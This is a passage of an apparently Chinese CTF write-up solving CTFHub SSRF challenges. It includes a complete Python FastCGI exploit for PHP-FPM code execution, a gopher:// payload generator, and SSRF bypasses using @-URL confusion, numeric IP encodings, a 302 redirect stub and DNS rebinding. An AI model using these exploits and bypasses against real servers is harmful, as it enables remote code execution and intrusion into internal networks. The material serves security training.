    <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>(s), <span class="hljs-built_in">str</span>):
        <span class="hljs-keyword">return</span> s
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):
        s = <span class="hljs-built_in">str</span>(s, <span class="hljs-string">'utf-8'</span>, <span class="hljs-string">'strict'</span>)
    <span class="hljs-keyword">else</span>:
        s = <span class="hljs-built_in">str</span>(s)
    <span class="hljs-keyword">return</span> s
<span class="hljs-keyword">class</span> <span class="hljs-title class_">FastCGIClient</span>:
    <span class="hljs-string">"""A Fast-CGI Client for Python"""</span>
    <span class="hljs-comment"># private</span>
    __FCGI_VERSION = <span class="hljs-number">1</span>
    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span>
    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span>
    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span>
    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span>
    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span>
    __FCGI_TYPE_END = <span class="hljs-number">3</span>
    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span>
    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span>
    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span>
    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span>
    __FCGI_TYPE_DATA = <span class="hljs-number">8</span>
    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span>
    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span>
    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span>
    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span>
    <span class="hljs-comment"># request state</span>
    FCGI_STATE_SEND = <span class="hljs-number">1</span>
    FCGI_STATE_ERROR = <span class="hljs-number">2</span>
    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):
        self.host = host
        self.port = port
        self.timeout = timeout
        <span class="hljs-keyword">if</span> keepalive:
            self.keepalive = <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            self.keepalive = <span class="hljs-number">0</span>
        self.sock = <span class="hljs-literal">None</span>
        self.requests = <span class="hljs-built_in">dict</span>()
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__connect</span>(<span class="hljs-params">self</span>):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)
        <span class="hljs-comment"># if self.keepalive:</span>
        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span>
        <span class="hljs-comment"># else:</span>
        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span>
        <span class="hljs-keyword">try</span>:
            self.sock.connect((self.host, <span class="hljs-built_in">int</span>(self.port)))
        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> msg:
            self.sock.close()
            self.sock = <span class="hljs-literal">None</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(msg))
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):
        length = <span class="hljs-built_in">len</span>(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \
               + bchr(requestid &amp; <span class="hljs-number">0xFF</span>) \
               + bchr((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \
               + bchr(length &amp; <span class="hljs-number">0xFF</span>) \
               + bchr(<span class="hljs-number">0</span>) \
               + bchr(<span class="hljs-number">0</span>) \
               + content
        <span class="hljs-keyword">return</span> buf
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):
        nLen = <span class="hljs-built_in">len</span>(name)
        vLen = <span class="hljs-built_in">len</span>(value)
        record = <span class="hljs-string">b''</span>
        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:
            record += bchr(nLen)
        <span class="hljs-keyword">else</span>:
            record += bchr((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \
                      + bchr((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \
                      + bchr((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \
                      + bchr(nLen &amp; <span class="hljs-number">0xFF</span>)
        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:
            record += bchr(vLen)
        <span class="hljs-keyword">else</span>:
            record += bchr((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \
                      + bchr((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \
                      + bchr((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \
                      + bchr(vLen &amp; <span class="hljs-number">0xFF</span>)
        <span class="hljs-keyword">return</span> record + name + value
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):
        header = <span class="hljs-built_in">dict</span>()
        header[<span class="hljs-string">'version'</span>] = bord(stream[<span class="hljs-number">0</span>])
        header[<span class="hljs-string">'type'</span>] = bord(stream[<span class="hljs-number">1</span>])
        header[<span class="hljs-string">'requestId'</span>] = (bord(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">3</span>])
        header[<span class="hljs-string">'contentLength'</span>] = (bord(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">5</span>])
        header[<span class="hljs-string">'paddingLength'</span>] = bord(stream[<span class="hljs-number">6</span>])
        header[<span class="hljs-string">'reserved'</span>] = bord(stream[<span class="hljs-number">7</span>])
        <span class="hljs-keyword">return</span> header
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIRecord</span>(<span class="hljs-params">self, buffer</span>):
        header = buffer.read(<span class="hljs-built_in">int</span>(self.__FCGI_HEADER_SIZE))
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">else</span>:
            record = self.__decodeFastCGIHeader(header)
            record[<span class="hljs-string">'content'</span>] = <span class="hljs-string">b''</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">'contentLength'</span> <span class="hljs-keyword">in</span> record.keys():
                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">'contentLength'</span>])
                record[<span class="hljs-string">'content'</span>] += buffer.read(contentLength)
            <span class="hljs-keyword">if</span> <span class="hljs-string">'paddingLength'</span> <span class="hljs-keyword">in</span> record.keys():
                skiped = buffer.read(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">'paddingLength'</span>]))
            <span class="hljs-keyword">return</span> record
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">self, nameValuePairs={}, post=<span class="hljs-string">''</span></span>):
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__connect():
            <span class="hljs-built_in">print</span>(<span class="hljs-string">'connect failure! please check your fasctcgi-server !!'</span>)
            <span class="hljs-keyword">return</span>
        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)
        self.requests[requestId] = <span class="hljs-built_in">dict</span>()
        request = <span class="hljs-string">b""</span>
        beginFCGIRecordContent = bchr(<span class="hljs-number">0</span>) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span>
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = <span class="hljs-string">b''</span>
        <span class="hljs-keyword">if</span> nameValuePairs:
            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)
        <span class="hljs-keyword">if</span> paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">b''</span>, requestId)
        <span class="hljs-keyword">if</span> post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">b''</span>, requestId)
        self.sock.send(request)
        self.requests[requestId][<span class="hljs-string">'state'</span>] = FastCGIClient.FCGI_STATE_SEND
        self.requests[requestId][<span class="hljs-string">'response'</span>] = <span class="hljs-string">b''</span>
        <span class="hljs-keyword">return</span> self.__waitForResponse(requestId)
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):
        data = <span class="hljs-string">b''</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            buf = self.sock.recv(<span class="hljs-number">512</span>)
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(buf):
                <span class="hljs-keyword">break</span>
            data += buf
        data = BytesIO(data)
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            response = self.__decodeFastCGIRecord(data)
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:
                <span class="hljs-keyword">break</span>
            <span class="hljs-keyword">if</span> response[<span class="hljs-string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:
                <span class="hljs-keyword">if</span> response[<span class="hljs-string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests[<span class="hljs-string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR
                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">'requestId'</span>]):
                    self.requests[requestId][<span class="hljs-string">'response'</span>] += response[<span class="hljs-string">'content'</span>]
            <span class="hljs-keyword">if</span> response[<span class="hljs-string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        <span class="hljs-keyword">return</span> self.requests[requestId][<span class="hljs-string">'response'</span>]
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">"fastcgi connect host:{} port:{}"</span>.<span class="hljs-built_in">format</span>(self.host, self.port)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    parser = argparse.ArgumentParser(description=<span class="hljs-string">'Php-fpm code execution vulnerability client.'</span>)
    parser.add_argument(<span class="hljs-string">'host'</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">'Target host, such as 127.0.0.1'</span>)
    parser.add_argument(<span class="hljs-string">'file'</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)
    parser.add_argument(<span class="hljs-string">'-c'</span>, <span class="hljs-string">'--code'</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">'What php code your want to execute'</span>, default=<span class="hljs-string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)
    parser.add_argument(<span class="hljs-string">'-p'</span>, <span class="hljs-string">'--port'</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">'FastCGI port'</span>, default=<span class="hljs-number">9000</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)
    args = parser.parse_args()
    client = FastCGIClient(args.host, args.port, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)
    params = <span class="hljs-built_in">dict</span>()
    documentRoot = <span class="hljs-string">"/"</span>
    uri = args.file
    content = args.code
    params = {
        <span class="hljs-string">'GATEWAY_INTERFACE'</span>: <span class="hljs-string">'FastCGI/1.0'</span>,
        <span class="hljs-string">'REQUEST_METHOD'</span>: <span class="hljs-string">'POST'</span>,
        <span class="hljs-string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="hljs-string">'/'</span>),
        <span class="hljs-string">'SCRIPT_NAME'</span>: uri,
        <span class="hljs-string">'QUERY_STRING'</span>: <span class="hljs-string">''</span>,
        <span class="hljs-string">'REQUEST_URI'</span>: uri,
        <span class="hljs-string">'DOCUMENT_ROOT'</span>: documentRoot,
        <span class="hljs-string">'SERVER_SOFTWARE'</span>: <span class="hljs-string">'php/fcgiclient'</span>,
        <span class="hljs-string">'REMOTE_ADDR'</span>: <span class="hljs-string">'127.0.0.1'</span>,
        <span class="hljs-string">'REMOTE_PORT'</span>: <span class="hljs-string">'9985'</span>,
        <span class="hljs-string">'SERVER_ADDR'</span>: <span class="hljs-string">'127.0.0.1'</span>,
        <span class="hljs-string">'SERVER_PORT'</span>: <span class="hljs-string">'80'</span>,
        <span class="hljs-string">'SERVER_NAME'</span>: <span class="hljs-string">"localhost"</span>,
        <span class="hljs-string">'SERVER_PROTOCOL'</span>: <span class="hljs-string">'HTTP/1.1'</span>,
        <span class="hljs-string">'CONTENT_TYPE'</span>: <span class="hljs-string">'application/text'</span>,
        <span class="hljs-string">'CONTENT_LENGTH'</span>: <span class="hljs-string">"%d"</span> % <span class="hljs-built_in">len</span>(content),
        <span class="hljs-string">'PHP_VALUE'</span>: <span class="hljs-string">'auto_prepend_file = php://input'</span>,
        <span class="hljs-string">'PHP_ADMIN_VALUE'</span>: <span class="hljs-string">'allow_url_include = On'</span>
    }
    response = client.request(params, content)</code></pre>
<p>同时可以在vps或者kali上开启监听，这里我用kali监听，并且将监听到的流量给了1.txt</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222210517783.png" alt="image-20231222210517783"></p>
<p>同时我们在本地上执行上述exp</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222210656011.png" alt="image-20231222210656011"></p>
<p>得到1.txt我们需要对其中的内容进行两次url编码</p>
<pre><code class="hljs plaintext">python [脚本名] -c [要执行的代码] -p [端口号] [ip] [要执行的php文件]</code></pre>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse
file= <span class="hljs-built_in">open</span>(<span class="hljs-string">'1.txt'</span>,<span class="hljs-string">'rb'</span>)
payload= file.read()
payload= urllib.parse.quote(payload).replace(<span class="hljs-string">"%0A"</span>,<span class="hljs-string">"%0A%0D"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"gopher://127.0.0.1:9000/_"</span>+urllib.parse.quote(payload))</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222210609376.png" alt="image-20231222210609376"></p>
<p>将得到的内容直接传入url即可，如下图可以看到虽然乱码，但是我们知道了当前flag文件的位置了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222210459609.png" alt="image-20231222210459609"></p>
<p>接下来就是进行读取了，步骤同上述即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222210941100.png" alt="image-20231222210941100"></p>
<h3 id="url-bypass">URL Bypass</h3>
<p>至于那个打Redis的放在其他文章了，这里懒得在写一次了。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20240107193125161.png" alt="image-20240107193125161"></p>
<p>这里根据提示url后面必须以上面的开头，直接@绕过：</p>
<pre><code class="hljs scss">采用http基本身份认证的方式绕过：
如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异
在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。
详情可参考PHP官方文档</code></pre>
<p>构造：<code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code>即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20240107193234698.png" alt="image-20240107193234698"></p>
<h3 id="数字ip-bypass">数字IP Bypass</h3>
<p>题目提示：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20240107193524657.png" alt="image-20240107193524657"></p>
<p>这里看到了ban的信息，127、172、@、. 均被过滤，这里看到一个IP进制转换的网址很不错：</p>
<p><a target="_blank" rel="noopener" href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">https://tool.520101.com/wangluo/jinzhizhuanhuan/</a></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20240107193721630.png" alt="image-20240107193721630"></p>
<p>我们对上述的进制一个个尝试一下，发现十进制的可以利用</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20240107193756362.png" alt="image-20240107193756362"></p>
<p>tips：</p>
<pre><code class="hljs scss"><span class="hljs-number">127.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>：八进制：<span class="hljs-number">0177.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>十六进制：<span class="hljs-number">0</span>x7f<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>十进制：<span class="hljs-number">2130706433</span>

IP地址转为八、十、十六进制及IP地址省略写法（以下均代表<span class="hljs-number">127.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>）

   <span class="hljs-number">0177.00</span><span class="hljs-selector-class">.00</span><span class="hljs-selector-class">.01</span>
   <span class="hljs-number">2130706433</span>
   <span class="hljs-number">0</span>x7f<span class="hljs-selector-class">.0x0</span><span class="hljs-selector-class">.0x0</span><span class="hljs-selector-class">.0x1</span>
   <span class="hljs-number">127.1</span></code></pre>
<h3 id="302跳转-bypass">302跳转 Bypass</h3>
<p>题目提示：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</p>
<p>我们先利用file协议读取源码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);

<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>])) {
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: /?url=_"</span>);
    <span class="hljs-keyword">exit</span>;
}

<span class="hljs-variable">$url</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>];

<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/127|172|10|192/"</span>, <span class="hljs-variable">$url</span>)) {
    <span class="hljs-keyword">exit</span>(<span class="hljs-string">"hacker! Ban Intranet IP"</span>);
}

<span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);
<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
<span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);</code></pre>
<p>不过可以看到这里的过滤并不全，利用进制转换依旧可以绕过，但我们还是要学一下302跳转的。</p>
<p>原理：需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中，服务端代码如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: http://127.0.0.1/flag.php"</span>); <span class="hljs-comment">#这里输入你想要访问的内网IP</span>
<span class="hljs-keyword">exit</span>(); 
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20240107194931163.png" alt="image-20240107194931163"></p>
<h3 id="dns重绑定-bypass">DNS重绑定 Bypass</h3>
<p>题目提示：关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);

<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>])) {
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: /?url=_"</span>);
    <span class="hljs-keyword">exit</span>;
}

<span class="hljs-variable">$url</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>];

<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/127|172|10|192/"</span>, <span class="hljs-variable">$url</span>)) {
    <span class="hljs-keyword">exit</span>(<span class="hljs-string">"hacker! Ban Intranet IP"</span>);
}

<span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
<span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);</code></pre>
<p>源码没变，依照题目的意思：我们知道我们在输入域名的时候，对方的DNS服务器会将其解析为对应IP地址，随后判断IP地址是否安全，如果安全在curl去请求这个IP地址，但从这个解析判断到curl请求的过程中有一个时间差，我们可以利用该时间差进行攻击。</p>
<p>先搞一个域名让其解析的IP地址为一个安全的，随后在对方服务器成功解析并判断IP安全之后，在将域名绑定为127.0.0.1等内网IP，随后成功绕过限制而被curl去请求。这里用到个网站：</p>
<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20240107200717155.png" alt="image-20240107200717155"></p>
<p>简单来说我们在上面写一个正常IP，和一个非正常IP，接着这个网站会自动生成一个TTL值很低的域名，这意味着该DNS记录在DNS服务器上的缓存时间就很小，导致修改记录之后在各地的生效时间加快。</p>
<p>意味着如果我们临时改变域名指向的IP，他会很快知悉到这个域名解析变化，并顺应我们的改变快速将域名解析到其他IP。</p>
<p>具体可参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89426041">https://zhuanlan.zhihu.com/p/89426041</a></p>
<h1 id="0x03-参考文章">0x03 参考文章</h1>
<p>http协议参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u013870094/article/details/79098628">HTTP/1.1详解</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54037445/article/details/127926840?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170290103516800211517623%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170290103516800211517623&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-127926840-null-null.142%5Ev96%5Epc_search_result_base4&amp;utm_term=ctfhub%20git%E6%B3%84%E9%9C%B2stash&amp;spm=1018.2226.3001.4187">CTFHub-Web-信息泄露-Git泄露</a></p>
<p><a target="_blank" rel="noopener" href="https://www.wolai.com/ctfhub/4Ezj7s8fqNhFxujCdxbuy8">命令注入</a>–管道符命令的解释参考</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/118387034?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=ctfhub%20post%E8%AF%B7%E6%B1%82&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-118387034.142%5Ev96%5Epc_search_result_base9&amp;spm=1018.2226.3001.4187">CTFHub技能树 Web-SSRF POST请求</a></p>
